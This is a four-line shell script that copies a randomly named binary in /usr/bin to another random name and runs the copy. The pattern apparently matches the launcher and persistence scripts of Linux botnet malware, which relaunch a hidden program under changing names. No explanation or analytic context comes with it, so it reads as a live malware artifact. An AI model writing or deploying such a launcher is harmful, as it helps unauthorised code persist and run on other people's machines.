#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
cp "/usr/bin/ldloxk" "/usr/bin/rhztlczmeq"
"/usr/bin/rhztlczmeq"